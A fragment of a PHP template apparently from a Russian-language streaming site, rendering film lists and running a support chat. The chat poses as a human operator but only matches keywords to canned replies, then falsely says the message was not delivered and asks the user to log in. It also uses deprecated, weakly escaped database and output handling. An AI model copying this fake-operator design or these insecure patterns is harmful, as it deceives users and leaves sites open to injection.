						<img class="ico" src="http://downloadicons.net/sites/default/files/play-icon-23008.png">

					</div>	
		            <div class="title"><?=$Series["title"]?></div>
		        </a>
		    </div>

	<? } }
}

if($_POST["whats_view"]){?>
	<?php 
						$arrs = $Main->getFilmLists($_POST["whats_view"]);
						shuffle($arrs);
						for ($i = 1; $i <= 5; $i++){ ?>
						ds
						<li class="voi autoload-payment loaded" >
		    				<a href="/serial/view/<?=$arrs[$i]["id"]?>-<?=$arrs[$i]["link"]?>.html" title="<?=$arrs[$i]['title'];?>">
		                    	<img class="voi__poster" src="http://imagees2.pw/i2/<?=$arrs[$i]['id']?>/<?=$arrs[$i]['poster_url'];?>" width="162" height="228">
		            		</a>
		        			<div class="voi__content">
		        				<p class="voi__title">
		            				<a class="voi__title-link" href="/serial/view/<?=$arrs[$i]["id"]?>-<?=$arrs[$i]["link"]?>.html">
		            					<?=$arrs[$i]['name']?>
		            				</a>
		        				</p>
		        				<p class="voi__info"><?=$arrs[$i]['info_year'];?>, <?=$arrs[$i]['info_country'];?>, <?=$arrs[$i]['info_genre'];?></p>
		    				</div>
						</li>
					<? } ?>
<?}

if($_POST["choose_portal"]){ ?>
<?php 
					foreach($Main->getFilmListsTwo($_POST["choose_portal"]) as $item){ ?>
					<li class="voi autoload-payment loaded">
    					<a href="/serial/view/<?=$item["id"]?>-<?=$item["link"]?>.html" title="<?=$item["title"]?>">  
                    		<img class="voi__poster" src="http://imagees2.pw/i2/<?=$item['id']?>/<?=$item['poster_url'];?>" width="162" height="228">
            			</a>
        				<div class="voi__content">
	        				<p class="voi__title">
	            				<a class="voi__title-link" href="/serial/view/<?=$item["id"]?>-<?=$item["link"]?>.html">
	            					<?=$item["name"]?>
	            				</a>
	        				</p>
	        				<p class="voi__info">
	                            <?=$item['info_year'];?>, <?=$item['info_country'];?>, <?=$item['info_genre'];?>
	                    	</p>
   						</div>   
					</li>
					<? } ?>
<? }

if($_POST["t"]){
	$DB->query("insert into `support_question` (`text`,`date`) values ('".mysql_escape_string($_POST["t"])."','".date("d.m.Y в H:i")."')");

	//unset($_SESSION["count_checker"]);
	//unset($_SESSION["answered"]);


	if($_SESSION["count_checker"] > 2){
		echo '<div class="chat-dialog-mess" style="color:red"><i class="fa fa-warning"></i> Сообщение не доставленно, авторизуйтесь пожалуйста</div>';
	} else {

		if(isset($_SESSION["mobile_id"])) {
			$_SESSION["count_checker"] = 3;
			echo '<div class="chat-dialog-el">
				<div class="chat-dialog-mess" style="color:red"><i class="fa fa-warning"></i> В данный момент нет свободного оператора.</div>
			</div>';

		} else {

			if(!isset($_SESSION["answered"])){
				$dataArray = array();
			} else {
				$dataArray = $_SESSION["answered"];
			}
			//print_r($dataArray);
			
			if(!isset($_SESSION["count_checker"])) {
				$_SESSION["count_checker"] = 0;
			}
			$_SESSION["count_checker"] = $_SESSION["count_checker"] + 1;

			$data = "";
			$DB->query("select * from `support_keys` order by `id` asc");
			while($row = $DB->fetch_array()){
				$inKey = mb_strtolower($row["key"], 'UTF-8');
				$inString = mb_strtolower($_POST["t"], 'UTF-8');
				if (preg_match("/".$inKey."/i", $inString)) {
					$q = mysql_query("select * from `support_answer` where `key_id`='".$row["id"]."'");
					$in = mysql_fetch_array($q);
					$key = in_array($in["id"], $dataArray);
					if (!$key) {
						$dataArray[] = $in["id"];
				    	$data .= $in["answer"];
				    } 
				} 
				//$data = $inKey.'>'.$inString;
			}


			if($data == "") {
				//$DB->query("select * from `support_answer` where `key_id`='0' order by rand() limit 1");
				//$in = $DB->fetch_array();
				if($in["answer"] == ""){
					$answer = "Сообщение не доставленно, авторизуйтесь пожалуйста";
				} else {
					//if (!array_search($in["id"], $dataArray)) {
					//	$dataArray[] = $in["id"];
					//	$answer = $in["answer"];
					//}
				}
				
			} else {
				$answer = $data;
			}
			
			if($answer == "Сообщение не доставленно, авторизуйтесь пожалуйста"){
				$oper = "<b style='color:red'>Ошибка</b>";
			} else {
				$oper = $_SESSION["name_operator"];
			}
			
			echo '
				<div class="chat-dialog-name">'.$oper.'</div>
				<div class="chat-dialog-mess">'.$answer.'</div>
				<div class="chat-dialog-el-time">'.date("H:i").'</div>
			';
			//print_r($dataArray);

			$_SESSION["answered"] = $dataArray;

		}
	}

}



echo $number;
?>
